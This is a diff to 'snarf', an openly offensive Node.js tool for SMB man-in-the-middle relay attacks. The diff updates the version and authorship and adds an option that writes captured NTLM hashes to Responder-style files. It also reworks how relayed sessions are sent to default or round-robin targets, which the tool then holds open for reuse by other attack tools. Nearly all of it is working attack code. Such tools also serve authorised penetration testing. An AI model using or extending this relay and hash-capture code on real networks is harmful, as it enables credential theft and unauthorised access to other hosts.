@@ -1,17 +1,18 @@
 //
 // snarf - SMB man-in-the-middle tool
-// Copyright (C) 2013 Josh Stone (yakovdk@gmail.com)
+// Copyright (C) 2015 Josh Stone (yakovdk@gmail.com)
+//                    Victor Mata (victor@offense-in-depth.com)
 //
 // This program is free software; you can redistribute it and/or
 // modify it under the terms of the GNU General Public License
 // as published by the Free Software Foundation; either version 2
 // of the License, or (at your option) any later version.
-// 
+//
 // This program is distributed in the hope that it will be useful,
 // but WITHOUT ANY WARRANTY; without even the implied warranty of
 // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 // GNU General Public License for more details.
-// 
+//
 // You should have received a copy of the GNU General Public License
 // along with this program; if not, write to the Free Software
 // Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
@@ -24,13 +25,13 @@
 //
 // The attacker must set up his attack so that inbound SMB sessions are
 // redirected to the "bind-IP" for snarf, which will then relay the
-// connection through its completion.  Once complete, however, snarf 
+// connection through its completion.  Once complete, however, snarf
 // will maintain the connection and provide access for other tools to
-// connect through it at localhost:445.  
+// connect through it at localhost:445.
 //
-// The session can be reused by any number of other tools, largely 
+// The session can be reused by any number of other tools, largely
 // without impairment of the original session's access to the server
-// system.  
+// system.
 //
 // Sample usage:
 //
@@ -40,9 +41,6 @@
 // coming in on that IP on port 445 will be relayed to to their
 // destinations.  It is intended that you use iptables to redirect
 // traffic appropriately.
-//
-// Contact: yakovdk@gmail.com
-// Date:    2013-11-30
 //
 
 var util       = require('util');
@@ -59,15 +57,16 @@ var fs         = require('fs');
 var cycle      = require("./cycle.js");
 var bl         = require("./blacklist.js");
 
-out.red("SNARF - 0.2 - SMB Man in the Middle Attack Engine");
+out.red("SNARF - 0.3 - SMB Man in the Middle Attack Engine");
 out.red("by Josh Stone (yakovdk@gmail.com) and Victor Mata (victor@offense-in-depth.com)");
 
 getopt = new Getopt([
     ['d', 'defaultip=IP'  , 'Default IP (think LLMNR or NBNS)'],
     ['f', 'file=FILE'     , 'Round-robin default destination from file'],
-    ['l',       , 'Keep limit of 3 connections for each client/server pair: EXPERIMENTAL'],
+    ['l',                 , 'Keep limit of 3 connections for each client/server pair: EXPERIMENTAL'],
     ['b', 'blacklist=FILE', 'Define an IP blacklist to avoid relaying to specified hosts'],
-    ['h',         , 'Show help and usage statement']
+    ['r', 'responder'     , 'Save responder-style hashes: EXPERIMENTAL'],
+    ['h',                 , 'Show help and usage statement']
 ]);
 
 getopt.setHelp(
@@ -101,12 +100,27 @@ if(opt.options['blacklist']) {
     globals.blacklist = new bl.Blacklist();
 }
 
-// 
+//
 // We want to log all hashes we catch in a file.
 //
 
 globals.hashfile = fs.createWriteStream("snarf.pot", { flags: "a", encoding: null, mode: 0777 });
 globals.hashes = [];
+
+//
+// [BETA] Alternative method of saving hashes. This method is identical
+//        to the Responder.py tool. Now, theres no excuse to run Responder
+//        by itself :)
+//
+
+if(opt.options['responder']) {
+    globals.responderhash = function(srcip, htype, hash) {
+        filename = "SMB-"+htype+"-Client-"+srcip+".txt";
+        wstream = fs.createWriteStream(filename, { flags: 'a', encoding: null, mode: 0644 });
+        wstream.write(hash);
+        wstream.end();
+    }
+}
 
 //
 // One of the more useful features is the ability to send a request
@@ -118,17 +132,21 @@ globals.hashes = [];
 //
 
 if(opt.options['defaultip']) {
-    globals.editip = true;
-    globals.defip  = function() { return opt.options["defaultip"]; };
+    globals.cycle        = new cycle.Cycle();
+    globals.targetsingle = true;
+    globals.targetinit   = function() { return opt.options["defaultip"] }
+    globals.target       = function() { return globals.targetinit() }
 } else if(opt.options['file']) {
-    var roundrobin  = new cycle.fromFile(opt.options['file']);
-    globals.editip  = false;
-    globals.defpeek = function() { return roundrobin.current() }
-    globals.defip   = function() { return roundrobin.shift() }
+    globals.cycle         = cycle.loadCycle(opt.options['file']);
+    globals.targetsingle  = false;
+    globals.target        = function() { return globals.cycle.shift() }
+    globals.targetpeek    = function() { return globals.cycle.current() }
 } else {
-    globals.editip = true;
-    globals.defip  = function() { return null; };
-    globals.defpeek = function() { return false; };
+    globals.cycle         = new cycle.Cycle();
+    globals.targetsingle  = true;
+    globals.target        = function() { return null }
+    //globals.targetpeek    = function() { return false }
+    globals.targetpeek    = undefined;
 }
 
 ctrl.ControlPanel(broker, 4001, globals);
@@ -136,11 +154,11 @@ ctrl.ControlPanel(broker, 4001, globals);
 client = net.createServer(function(sock) {
     sock.pause();
     out.red("Client " + sock.remoteAddress + ":" + sock.remotePort + " connected");
-    
+
     router.checkout(sock.remoteAddress, sock.remotePort, function(tip) {
         if(tip == bindip || tip == "0.0.0.0") {
-            if(globals.defip) { // && globals.defip != "0.0.0.0") {
-                var target = globals.defip();
+            if(globals.target) { // && globals.target != "0.0.0.0") {
+                var target = globals.target();
                 if(!globals.blacklist.ok(sock.remoteAddress)) {
                     midl.NullMiddler(sock);
                     out.red("Blacklist prevents relaying " + sock.remoteAddress + " to default destination");
@@ -150,7 +168,7 @@ client = net.createServer(function(sock) {
                     out.red("Got inbound connection, routing to " + target);
                     tip = target;
                 } else {
-                    // Consider the MS09-001 check
+                    // Consider the MS08-068 check
                     out.red("Received connection from " + target + " to " + target);
                     out.red("Not middling (it wouldn't work anyway)");
                     midl.NullMiddler(sock);
@@ -169,7 +187,7 @@ client = net.createServer(function(sock) {
 
         var server = net.connect({port: 445, host: tip}, function() {
             if(opt.options['limit'] && broker.countDups(sock.remoteAddress, tip) >= 3) {
-                
+
                 // Sometimes, servers can get fussy if they have too
                 // many open sessions.  This is an EXPERIMENTAL
                 // feature to relay and then throw away any
@@ -195,8 +213,8 @@ client = net.createServer(function(sock) {
                 sock.resume();
             }
         });
-        server.on("error", function() {
-            out.red("Server connection encountered an error");
+        server.on("error", function(exception) {
+            out.red("Server connection encountered an error" + exception);
             out.red("This could be because of a failure to route to the destination");
         });
     });
